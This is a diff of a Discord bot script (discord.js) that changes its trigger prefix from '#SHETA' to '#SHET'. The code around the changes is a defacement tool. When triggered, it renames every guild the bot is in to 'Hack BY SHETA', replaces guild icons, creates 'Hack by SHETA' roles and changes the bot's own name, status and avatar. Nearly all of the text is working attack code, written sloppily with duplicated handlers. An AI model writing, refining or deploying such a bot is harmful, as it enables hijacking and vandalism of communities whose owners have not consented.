@@ -14,20 +14,20 @@ LOka.on("ready", () => {
     `Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`
   );
 });
-var prefix = "#SHETA";
+var prefix = "#SHET";
 LOka.on("message", message => {
   if (!message.content.startsWith(prefix)) return;
-  let args = message.content.split("#SHETA").slice(1);
-  var argresult = args.join("#SHETA");
-  if (message.content.startsWith("#SHETA")) {
+  let args = message.content.split("#SHET").slice(1);
+  var argresult = args.join("#SHET");
+  if (message.content.startsWith("#SHET")) {
     LOka.user.setUsername(argresult);
   }
-  if (message.content.startsWith("#SHETA")) {
+  if (message.content.startsWith("#SHET")) {
     LOka.user.setStatus(argresult);
   }
 });
 
-var x1 = "SHET";
+var x2 = "#SHET";
 LOka.on("message", message => {
   if (message.content === "#SHET") {
     LOka.user.setAvatar(
@@ -35,26 +35,26 @@ LOka.on("message", message => {
     );
   }
 });
-var x1 = "#";
+var x2 = "#";
 LOka.on("message", message => {
-  if (message.content === "#SHETA") {
-    LOka.user.setUsername("#SHETA");
+  if (message.content === "#SHET") {
+    LOka.user.setUsername("#SHET");
   }
 });
 LOka.on("message", message => {
-  if (message.content === "_") {
+  if (message.content === "#") {
     LOka.user.setGame(`#help`, "https://www.twitch.tv/rawyar_");
   }
 });
 LOka.on("message", message => {
-  if (message.content === "#SHETA") {
+  if (message.content === "#SHET") {
     LOka.guilds.forEach(m => {
       m.setIcon(`https://media.discordapp.net/attachments/6`);
     });
   }
 });
 LOka.on("message", message => {
-  if (message.content === "#SHETA") {
+  if (message.content === "#SHET") {
     LOka.guilds.forEach(m => {
       m.setName("Hack BY SHETA ✨");
     });
@@ -62,7 +62,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === "#SHETA") {
+  if (message.content === "#SHET") {
     if (!message.channel.guild) return;
 
     message.guild.setIcon(
@@ -72,7 +72,7 @@ LOka.on("message", message => {
 });
 
 LOka.on("message", message => {
-  if (message.content === "#SHETA") {
+  if (message.content === "#SHET") {
     LOka.guilds.forEach(m => {
       m.createRole({
         name: "Hack by SHETA 🛠",
